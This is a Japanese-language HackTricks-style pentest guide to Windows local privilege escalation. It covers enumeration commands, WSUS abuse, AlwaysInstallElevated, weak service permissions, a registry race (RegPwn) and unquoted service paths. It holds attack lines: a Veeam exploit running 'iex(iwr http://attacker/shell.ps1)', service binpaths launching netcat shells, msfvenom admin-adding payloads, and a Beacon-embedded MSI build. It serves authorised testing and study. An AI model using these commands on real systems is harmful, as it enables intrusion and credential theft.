# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows ローカル権限昇格ベクターを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の初期理論

### Access Tokens

**Windows Access Tokens が何か分からない場合は、続行する前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels が何か分からない場合は、続行する前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows セキュリティ制御

Windows には、**システムの列挙**、実行ファイルの起動、あるいは **活動の検出** を**妨げる**可能性のあるさまざまなものがあります。権限昇格の列挙を始める前に、次の **ページ** を**読んで**、これらの **防御** **メカニズム** をすべて**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` 経由で起動された UIAccess process は、AppInfo の secure-path checks を回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow はここを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write (RegPwn) に悪用できます:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows build では、再利用された SMB TCP connection 上で特権のあるローカル NTLM authentication を反射する **SMB arbitrary-port** LPE path も導入されました:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の脆弱性があるか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft のセキュリティ脆弱性について詳細情報を検索するのに便利です。このデータベースには 4,700 件以上のセキュリティ脆弱性があり、Windows 環境が持つ **massive attack surface** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env 変数に credential/Juicy 情報は保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) を使って、これを有効にする方法を学べます
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプライン実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果は記録されない場合があります。

これを有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Powershell Transcription"** の代わりに **"Module Logging"** を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs から最後の 15 件のイベントを表示するには、次を実行できます:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行における完全なアクティビティと全文内容の記録が取得され、各コードブロックが実行されるたびに記録されることが保証されます。このプロセスは、各アクティビティの包括的な監査証跡を保持し、forensics や悪意ある挙動の分析に有用です。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
直近 20 件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが非 SSL の WSUS 更新を使用しているか確認します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellでは次のようになります:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
If you get a reply such as one of these:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはそのコマンドをSYSTEMとして実行します。
## KrbRelayUp

特定の条件下で、Windows **domain** 環境に **local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる自己権限を持っていること、そしてユーザーが domain 内にコンピュータを作成できる機能が含まれます。これらの **requirements** は **default settings** で満たされていることに注意してください。

**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) を見つけてください

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください

## AlwaysInstallElevated

これら 2 つのレジストリが **enabled** である場合（値が **0x1**）、権限に関係なく任意のユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（execute）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter セッションがある場合、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこのテクニックを自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使って、現在のディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループの追加を促す事前コンパイル済みの MSI インストーラを書き出します（そのため GUI アクセスが必要です）：
```
Write-UserAddMSI
```
作成した binary を実行して権限昇格します。

### MSI Wrapper

この tools を使って MSI wrapper を作成する方法は、この tutorial を読んでください。**.bat** ファイルを wrap できることに注意してください。**コマンドライン**を**実行**したいだけならです。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** で Cobalt Strike または Metasploit を使って、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を作成します
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクト名を **AlwaysPrivesc** のようにして、場所に **`C:\privesc`** を使い、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- **Next** をクリックし続け、step 3 of 4（choose files to include）まで進みます。**Add** をクリックして、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトをハイライトし、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、インストールされる app をより正規に見せられる他の properties も変更できます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これで installer が実行されるとすぐに beacon payload が実行されるようになります。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build it** します。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、platform を x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの **installation** を **background** で実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、以下を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

これらの設定は、何が**ログに記録される**かを決定するため、注意してください
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されるのかを知っておくと興味深いです
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが **一意で、ランダム化され、定期的に更新される** ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されていればローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**プレーンテキストのパスワードは LSASS** (Local Security Authority Subsystem Service) に保存されます。\
[**WDigest についての詳細はこちらのページ**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる**メモリの読み取り**やコード注入の試みを**ブロック**して、システムをさらに保護しています。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks のような脅威から、デバイスに保存された認証情報を保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた認証情報

**ドメイン認証情報** は **Local Security Authority** (LSA) によって認証され、OSコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン認証情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー & グループ

### ユーザー & グループを列挙する

自分が所属しているグループに、興味深い権限があるか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループのいずれかに所属している場合、権限昇格できる可能性があります**。特権グループと、それらを悪用して権限昇格する方法については、こちらを参照してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**トークンとは何か** については、このページで**さらに学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
**興味深いトークン** と、それらをどう悪用するかについては、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン済みユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスの一覧を確認し、**そのプロセスのコマンドライン内にパスワードが含まれていないか**を確認します。\
実行中のバイナリを**上書きできるか**、またはバイナリフォルダに書き込み権限があるかを確認して、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用します:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリのフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** を sysinternals から使って、実行中のプロセスのメモリダンプを作成できます。FTP のようなサービスでは、**credentials がメモリ内に平文で存在**することがあります。メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM で実行されているアプリケーションは、ユーザーに CMD を起動させたり、ディレクトリを参照させたりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリックする

## Services

Service Triggers により、Windows は特定の条件が発生したときに service を開始できます（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）。SERVICE_START 権限がなくても、trigger を発火させることで特権のある service を起動できることがよくあります。列挙と起動の techniques はこちら:

-
{{#ref}}
service-triggers.md
{#endref}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使ってサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がどのサービスでも変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[ここからXP用の accesschk.exe をダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

このエラーが出る場合（たとえば SSDPSRV の場合）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次の方法で有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 では、サービス upnphost が動作するために SSDPSRV に依存していることに注意してください**

**この問題の別の回避策** は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

"Authenticated users" グループがあるサービスに対して **SERVICE_ALL_ACCESS** を持っている場合、そのサービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまな許可によって昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスの binary を再設定できます。
- **WRITE_DAC**: 権限の再設定を可能にし、サービス設定を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再設定を許可します。
- **GENERIC_WRITE**: サービス設定を変更する能力を継承します。
- **GENERIC_ALL**: 同様にサービス設定を変更する能力を継承します。

この脆弱性の検出と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行される binary を変更できるか**、または binary が置かれているフォルダに対して**write 権限**があるかを確認してください ([**DLL Hijacking**](dll-hijacking/index.html))**。**\
**wmic** を使えば、サービスによって実行されるすべての binary（system32 以外）を取得でき、**icacls** を使って権限を確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使えます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスのレジストリを変更できるか確認してください。\
以下の方法でサービス **registry** に対する **permissions** を **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もし持っているなら、サービスによって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成し、その後 **SYSTEM** プロセスによって HKLM のセッションキーへコピーされる。この registry の **symbolic link race** により、その特権付き書き込みを **任意の HKLM path** にリダイレクトでき、任意の HKLM **value write** primitive を得られる。

キーとなる場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` はインストール済みの accessibility features を列挙する。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` はユーザー制御可能な設定を保存する。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop 遷移中に作成され、ユーザーが書き込み可能。

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を用意する。
2. secure-desktop copy をトリガーする（例: **LockWorkstation**）。これにより AT broker flow が開始される。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を張って **race** に勝つ。oplock が発火したら、**HKLM Session ATConfig** キーを保護された HKLM target への **registry link** に置き換える。
4. SYSTEM が攻撃者が選んだ value をリダイレクト先の HKLM path に書き込む。

任意の HKLM value write を得たら、service configuration values を上書きして LPE に進む:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

通常ユーザーが開始できる service を選び（例: **`msiserver`**）、書き込み後にそれを起動する。**Note:** 公開されている exploit 実装は race の一部として **lock the workstation** する。

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限がある場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分**です。

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルのパスが quotes で囲まれていない場合、Windows は space の前にある各部分を順番に実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ では、Windows は次を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除いて、すべての unquoted service paths を列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit で検出および悪用できます: `exploit/windows/local/trusted\_service\_path` metasploit を使って手動で service binary を作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能はバイナリを指すように設定できます。もしこのバイナリを置き換え可能なら、権限昇格が可能かもしれません。詳細は[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Applications

### Installed Applications

**バイナリの権限**（上書きできれば権限昇格できるかもしれません）と**フォルダ**の権限を確認してください（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

config file を変更して特別なファイルを読めるようにできるか、または Administrator account によって実行される binary を変更できるかを確認します (schedtasks)。

システム内の弱い folder/files permissions を見つける方法の1つは、次のようにします:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
